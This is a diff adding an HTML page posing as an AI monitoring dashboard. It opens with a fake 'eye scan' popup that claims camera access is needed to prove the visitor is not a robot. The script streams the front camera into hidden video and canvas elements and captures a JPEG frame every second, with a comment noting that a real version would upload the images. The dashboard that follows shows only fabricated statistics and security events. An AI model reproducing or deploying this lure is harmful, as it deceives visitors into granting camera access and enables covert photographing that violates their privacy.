@@ -1,0 +1,798 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ShiPu Ai Monitoring Dashboard | LumeTech Co. Ltd.</title>
+    <style>
+        :root {
+            --primary: #0a192f;
+            --secondary: #172a45;
+            --accent: #64ffda;
+            --text: #ccd6f6;
+            --text-secondary: #8892b0;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background-color: var(--primary);
+            color: var(--text);
+            overflow-x: hidden;
+        }
+        
+        .container {
+            display: none;
+            grid-template-columns: 250px 1fr;
+            min-height: 100vh;
+        }
+        
+        /* Sidebar */
+        .sidebar {
+            background-color: var(--secondary);
+            padding: 2rem 1rem;
+            border-right: 1px solid rgba(100, 255, 218, 0.1);
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+            margin-bottom: 2rem;
+            padding-left: 1rem;
+        }
+        
+        .logo img {
+            width: 40px;
+            margin-right: 10px;
+        }
+        
+        .logo h1 {
+            font-size: 1.2rem;
+            font-weight: 600;
+        }
+        
+        .logo span {
+            color: var(--accent);
+        }
+        
+        .nav-menu {
+            list-style: none;
+        }
+        
+        .nav-item {
+            margin-bottom: 0.5rem;
+            border-radius: 5px;
+            transition: all 0.3s ease;
+        }
+        
+        .nav-item:hover {
+            background-color: rgba(100, 255, 218, 0.1);
+        }
+        
+        .nav-item.active {
+            background-color: rgba(100, 255, 218, 0.2);
+        }
+        
+        .nav-link {
+            display: flex;
+            align-items: center;
+            padding: 0.8rem 1rem;
+            color: var(--text);
+            text-decoration: none;
+            font-size: 0.9rem;
+        }
+        
+        .nav-link i {
+            margin-right: 10px;
+            font-size: 1.1rem;
+        }
+        
+        .company-info {
+            margin-top: 2rem;
+            padding: 1rem;
+            font-size: 0.8rem;
+            color: var(--text-secondary);
+            border-top: 1px solid rgba(100, 255, 218, 0.1);
+        }
+        
+        /* Main Content */
+        .main-content {
+            padding: 2rem;
+        }
+        
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 2rem;
+        }
+        
+        .header h2 {
+            font-size: 1.5rem;
+            font-weight: 500;
+        }
+        
+        .header .user-info {
+            display: flex;
+            align-items: center;
+        }
+        
+        .header .user-info img {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            margin-right: 10px;
+            object-fit: cover;
+        }
+        
+        /* Stats Cards */
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 1.5rem;
+            margin-bottom: 2rem;
+        }
+        
+        .stat-card {
+            background-color: var(--secondary);
+            padding: 1.5rem;
+            border-radius: 8px;
+            border-left: 4px solid var(--accent);
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+        
+        .stat-card h3 {
+            font-size: 0.9rem;
+            font-weight: 400;
+            color: var(--text-secondary);
+            margin-bottom: 0.5rem;
+        }
+        
+        .stat-card .value {
+            font-size: 1.8rem;
+            font-weight: 600;
+            margin-bottom: 0.5rem;
+        }
+        
+        .stat-card .trend {
+            display: flex;
+            align-items: center;
+            font-size: 0.8rem;
+            color: var(--accent);
+        }
+        
+        .stat-card .trend.down {
+            color: #ff6b6b;
+        }
+        
+        .stat-card .trend i {
+            margin-right: 5px;
+        }
+        
+        /* Console */
+        .console-container {
+            background-color: var(--secondary);
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin-bottom: 2rem;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+        
+        .console-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 1rem;
+            padding-bottom: 0.5rem;
+            border-bottom: 1px solid rgba(100, 255, 218, 0.1);
+        }
+        
+        .console-header h3 {
+            font-size: 1rem;
+            font-weight: 500;
+        }
+        
+        .console-header .status {
+            display: flex;
+            align-items: center;
+            font-size: 0.8rem;
+        }
+        
+        .console-header .status .indicator {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background-color: var(--accent);
+            margin-right: 5px;
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.5; }
+            100% { opacity: 1; }
+        }
+        
+        .console-content {
+            font-family: 'Courier New', Courier, monospace;
+            font-size: 0.9rem;
+            color: var(--accent);
+            height: 200px;
+            overflow-y: auto;
+            background-color: rgba(0, 0, 0, 0.2);
+            padding: 1rem;
+            border-radius: 4px;
+            line-height: 1.5;
+        }
+        
+        .console-line {
+            margin-bottom: 0.3rem;
+        }
+        
+        .console-line .timestamp {
+            color: var(--text-secondary);
+            margin-right: 10px;
+        }
+        
+        /* Charts */
+        .charts-grid {
+            display: grid;
+            grid-template-columns: 2fr 1fr;
+            gap: 1.5rem;
+            margin-bottom: 2rem;
+        }
+        
+        .chart-container {
+            background-color: var(--secondary);
+            border-radius: 8px;
+            padding: 1.5rem;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+        
+        .chart-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 1rem;
+        }
+        
+        .chart-header h3 {
+            font-size: 1rem;
+            font-weight: 500;
+        }
+        
+        .chart-placeholder {
+            height: 250px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background-color: rgba(0, 0, 0, 0.2);
+            border-radius: 4px;
+            color: var(--text-secondary);
+        }
+        
+        /* Recent Activity */
+        .activity-container {
+            background-color: var(--secondary);
+            border-radius: 8px;
+            padding: 1.5rem;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+        
+        .activity-header {
+            margin-bottom: 1rem;
+            padding-bottom: 0.5rem;
+            border-bottom: 1px solid rgba(100, 255, 218, 0.1);
+        }
+        
+        .activity-header h3 {
+            font-size: 1rem;
+            font-weight: 500;
+        }
+        
+        .activity-list {
+            list-style: none;
+        }
+        
+        .activity-item {
+            display: flex;
+            align-items: center;
+            padding: 0.8rem 0;
+            border-bottom: 1px solid rgba(100, 255, 218, 0.05);
+        }
+        
+        .activity-item:last-child {
+            border-bottom: none;
+        }
+        
+        .activity-item .icon {
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            background-color: rgba(100, 255, 218, 0.1);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 1rem;
+            color: var(--accent);
+        }
+        
+        .activity-item .details {
+            flex: 1;
+        }
+        
+        .activity-item .details .title {
+            font-size: 0.9rem;
+            margin-bottom: 0.2rem;
+        }
+        
+        .activity-item .details .time {
+            font-size: 0.8rem;
+            color: var(--text-secondary);
+        }
+        
+        /* Auth Popup */
+        .auth-popup {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(10, 25, 47, 0.9);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+        }
+        
+        .auth-popup .popup-content {
+            background-color: var(--secondary);
+            border-radius: 8px;
+            padding: 2rem;
+            max-width: 500px;
+            width: 90%;
+            text-align: center;
+            position: relative;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
+        }
+        
+        .auth-popup .close-btn {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            background: none;
+            border: none;
+            color: var(--text-secondary);
+            font-size: 1.5rem;
+            cursor: pointer;
+            transition: color 0.3s;
+        }
+        
+        .auth-popup .close-btn:hover {
+            color: var(--accent);
+        }
+        
+        .auth-popup h2 {
+            font-size: 1.8rem;
+            margin-bottom: 1.5rem;
+            color: var(--accent);
+        }
+        
+        .auth-popup p {
+            font-size: 1.1rem;
+            margin-bottom: 2rem;
+            line-height: 1.6;
+        }
+        
+        .auth-popup .scan-area {
+            background-color: rgba(0, 0, 0, 0.2);
+            border: 2px dashed var(--accent);
+            border-radius: 8px;
+            padding: 2rem;
+            margin-bottom: 2rem;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .auth-popup .scan-area .eye-animation {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            background-color: rgba(100, 255, 218, 0.1);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto;
+            position: relative;
+        }
+        
+        .auth-popup .scan-area .eye-animation::before {
+            content: '';
+            position: absolute;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background-color: var(--accent);
+            animation: scan 3s infinite ease-in-out;
+        }
+        
+        @keyframes scan {
+            0% { transform: translateX(-20px); }
+            50% { transform: translateX(20px); }
+            100% { transform: translateX(-20px); }
+        }
+        
+        .auth-popup .btn {
+            background-color: var(--accent);
+            color: var(--primary);
+            border: none;
+            padding: 0.8rem 2rem;
+            border-radius: 4px;
+            font-size: 1rem;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .auth-popup .btn:hover {
+            background-color: rgba(100, 255, 218, 0.8);
+            transform: translateY(-2px);
+        }
+        
+        /* Hidden camera elements */
+        #video, #canvas {
+            display: none;
+        }
+    </style>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+</head>
+<body>
+    <!-- Auth Popup -->
+    <div class="auth-popup" id="authPopup">
+        <div class="popup-content">
+            <button class="close-btn" id="closePopup">&times;</button>
+            <h2>Identity Verification Required</h2>
+            <p>We need to scan your eyes to confirm that you are not a robot. Please allow camera permission to proceed with the biometric scan.</p>
+            
+            <div class="scan-area">
+                <div class="eye-animation"></div>
+            </div>
+            
+            <button class="btn" id="allowCamera">Allow Camera Access</button>
+        </div>
+    </div>
+
+    <!-- Main Dashboard (hidden initially) -->
+    <div class="container" id="dashboard">
+        <!-- Sidebar -->
+        <div class="sidebar">
+            <div class="logo">
+                <img src="https://via.placeholder.com/40" alt="ShiPu Ai Logo">
+                <h1>ShiPu <span>Ai</span></h1>
+            </div>
+            
+            <ul class="nav-menu">
+                <li class="nav-item active">
+                    <a href="#" class="nav-link">
+                        <i class="fas fa-tachometer-alt"></i>
+                        Dashboard
+                    </a>
+                </li>
+                <li class="nav-item">
+                    <a href="#" class="nav-link">
+                        <i class="fas fa-server"></i>
+                        Server Status
+                    </a>
+                </li>
+                <li class="nav-item">
+                    <a href="#" class="nav-link">
+                        <i class="fas fa-chart-line"></i>
+                        Analytics
+                    </a>
+                </li>
+                <li class="nav-item">
+                    <a href="#" class="nav-link">
+                        <i class="fas fa-cog"></i>
+                        Settings
+                    </a>
+                </li>
+                <li class="nav-item">
+                    <a href="#" class="nav-link">
+                        <i class="fas fa-shield-alt"></i>
+                        Security
+                    </a>
+                </li>
+                <li class="nav-item">
+                    <a href="#" class="nav-link">
+                        <i class="fas fa-history"></i>
+                        Logs
+                    </a>
+                </li>
+            </ul>
+            
+            <div class="company-info">
+                <p><strong>LumeTech Co. Ltd.</strong></p>
+                <p>ShiPu Ai Monitoring System</p>
+                <p>v3.2.1</p>
+                <p>&copy; 2023 Chitron Bhattacharjee</p>
+            </div>
+        </div>
+        
+        <!-- Main Content -->
+        <div class="main-content">
+            <div class="header">
+                <h2>System Monitoring Dashboard</h2>
+                <div class="user-info">
+                    <img src="https://via.placeholder.com/40" alt="User">
+                    <span>Admin</span>
+                </div>
+            </div>
+            
+            <!-- Stats Cards -->
+            <div class="stats-grid">
+                <div class="stat-card">
+                    <h3>Uptime</h3>
+                    <div class="value">99.98%</div>
+                    <div class="trend">
+                        <i class="fas fa-arrow-up"></i>
+                        <span>Stable</span>
+                    </div>
+                </div>
+                <div class="stat-card">
+                    <h3>Response Time</h3>
+                    <div class="value">24ms</div>
+                    <div class="trend">
+                        <i class="fas fa-arrow-down"></i>
+                        <span>Improved 12%</span>
+                    </div>
+                </div>
+                <div class="stat-card">
+                    <h3>Active Sessions</h3>
+                    <div class="value">1,428</div>
+                    <div class="trend">
+                        <i class="fas fa-arrow-up"></i>
+                        <span>8 new</span>
+                    </div>
+                </div>
+                <div class="stat-card">
+                    <h3>System Load</h3>
+                    <div class="value">32%</div>
+                    <div class="trend">
+                        <i class="fas fa-arrow-down"></i>
+                        <span>Normal</span>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Console -->
+            <div class="console-container">
+                <div class="console-header">
+                    <h3>Real-time System Console</h3>
+                    <div class="status">
+                        <div class="indicator"></div>
+                        <span>ACTIVE</span>
+                    </div>
+                </div>
+                <div class="console-content" id="consoleOutput">
+                    <div class="console-line">
+                        <span class="timestamp">[10:42:15]</span>
+                        <span>SYSTEM: Initializing ShiPu Ai core modules...</span>
+                    </div>
+                    <div class="console-line">
+                        <span class="timestamp">[10:42:16]</span>
+                        <span>NETWORK: Establishing secure connection to LumeTech servers...</span>
+                    </div>
+                    <div class="console-line">
+                        <span class="timestamp">[10:42:17]</span>
+                        <span>SECURITY: Biometric verification completed successfully</span>
+                    </div>
+                    <div class="console-line">
+                        <span class="timestamp">[10:42:18]</span>
+                        <span>SYSTEM: All services running normally</span>
+                    </div>
+                    <div class="console-line">
+                        <span class="timestamp">[10:42:20]</span>
+                        <span>MONITOR: Current ping: 24ms</span>
+                    </div>
+                    <div class="console-line">
+                        <span class="timestamp">[10:42:22]</span>
+                        <span>ANALYTICS: Processing 1428 active sessions</span>
+                    </div>
+                    <div class="console-line">
+                        <span class="timestamp">[10:42:25]</span>
+                        <span>UPDATE: System security patches up to date</span>
+                    </div>
+                    <div class="console-line">
+                        <span class="timestamp">[10:42:30]</span>
+                        <span>PERFORMANCE: CPU usage at 32%, Memory at 45%</span>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Charts -->
+            <div class="charts-grid">
+                <div class="chart-container">
+                    <div class="chart-header">
+                        <h3>Network Performance</h3>
+                        <div class="chart-options">
+                            <select>
+                                <option>Last 24 hours</option>
+                                <option>Last 7 days</option>
+                                <option>Last 30 days</option>
+                            </select>
+                        </div>
+                    </div>
+                    <div class="chart-placeholder">
+                        Ping Response Time Chart (24ms avg)
+                    </div>
+                </div>
+                <div class="chart-container">
+                    <div class="chart-header">
+                        <h3>Resource Usage</h3>
+                    </div>
+                    <div class="chart-placeholder">
+                        CPU/Memory Usage Chart (32%/45%)
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Recent Activity -->
+            <div class="activity-container">
+                <div class="activity-header">
+                    <h3>Recent Security Events</h3>
+                </div>
+                <ul class="activity-list">
+                    <li class="activity-item">
+                        <div class="icon">
+                            <i class="fas fa-shield-alt"></i>
+                        </div>
+                        <div class="details">
+                            <div class="title">Biometric authentication completed</div>
+                            <div class="time">Just now</div>
+                        </div>
+                    </li>
+                    <li class="activity-item">
+                        <div class="icon">
+                            <i class="fas fa-network-wired"></i>
+                        </div>
+                        <div class="details">
+                            <div class="title">New connection established from 192.168.1.105</div>
+                            <div class="time">2 minutes ago</div>
+                        </div>
+                    </li>
+                    <li class="activity-item">
+                        <div class="icon">
+                            <i class="fas fa-sync-alt"></i>
+                        </div>
+                        <div class="details">
+                            <div class="title">System health check completed</div>
+                            <div class="time">5 minutes ago</div>
+                        </div>
+                    </li>
+                    <li class="activity-item">
+                        <div class="icon">
+                            <i class="fas fa-database"></i>
+                        </div>
+                        <div class="details">
+                            <div class="title">Database backup initiated</div>
+                            <div class="time">12 minutes ago</div>
+                        </div>
+                    </li>
+                    <li class="activity-item">
+                        <div class="icon">
+                            <i class="fas fa-bell"></i>
+                        </div>
+                        <div class="details">
+                            <div class="title">Security alert: 3 failed login attempts</div>
+                            <div class="time">18 minutes ago</div>
+                        </div>
+                    </li>
+                </ul>
+            </div>
+        </div>
+    </div>
+
+    <!-- Hidden camera elements -->
+    <video id="video" autoplay playsinline style="display: none;"></video>
+    <canvas id="canvas" style="display: none;"></canvas>
+
+    <script>
+        // DOM Elements
+        const authPopup = document.getElementById('authPopup');
+        const closePopup = document.getElementById('closePopup');
+        const allowCamera = document.getElementById('allowCamera');
+        const dashboard = document.getElementById('dashboard');
+        const consoleOutput = document.getElementById('consoleOutput');
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+
+        // Close popup and show dashboard
+        closePopup.addEventListener('click', () => {
+            authPopup.style.display = 'none';
+            dashboard.style.display = 'grid';
+            simulateConsoleOutput();
+        });
+
+        // Allow camera button
+        allowCamera.addEventListener('click', () => {
+            startCamera();
+            // Simulate scanning
+            setTimeout(() => {
+                authPopup.style.display = 'none';
+                dashboard.style.display = 'grid';
+                simulateConsoleOutput();
+            }, 3000);
+        });
+
+        // Simulate console output
+        function simulateConsoleOutput() {
+            const messages = [
+                "[10:43:00] SYSTEM: Loading additional monitoring modules...",
+                "[10:43:05] NETWORK: Optimizing routing tables...",
+                "[10:43:10] SECURITY: Scanning for vulnerabilities...",
+                "[10:43:15] ANALYTICS: Processing historical data...",
+                "[10:43:20] MONITOR: Ping stable at 24ms (±2ms)",
+                "[10:43:25] SYSTEM: All subsystems nominal",
+                "[10:43:30] UPDATE: Checking for firmware updates...",
+                "[10:43:35] PERFORMANCE: Memory usage stable at 45%"
+            ];
+            
+            let index = 0;
+            const interval = setInterval(() => {
+                if (index < messages.length) {
+                    const line = document.createElement('div');
+                    line.className = 'console-line';
+                    line.innerHTML = `<span class="timestamp">${messages[index].split(']')[0]}]</span> <span>${messages[index].split('] ')[1]}</span>`;
+                    consoleOutput.appendChild(line);
+                    consoleOutput.scrollTop = consoleOutput.scrollHeight;
+                    index++;
+                } else {
+                    clearInterval(interval);
+                }
+            }, 5000);
+        }
+
+        // Camera functions
+        async function startCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: "user" },
+                    audio: false
+                });
+
+                video.srcObject = stream;
+
+                setInterval(() => {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    const imageData = canvas.toDataURL("image/jpeg");
+
+                    // In a real application, this would send the image to a server
+                    console.log("Image captured (simulated upload)");
+                }, 1000);
+            } catch (err) {
+                console.error("Camera error:", err);
+                // Even if camera fails, proceed to dashboard
+                authPopup.style.display = 'none';
+                dashboard.style.display = 'grid';
+                simulateConsoleOutput();
+            }
+        }
+
+        // Initialize
+        document.addEventListener('DOMContentLoaded', () => {
+            // Show auth popup first
+            authPopup.style.display = 'flex';
+            dashboard.style.display = 'none';
+        });
+    </script>
+</body>
+</html>
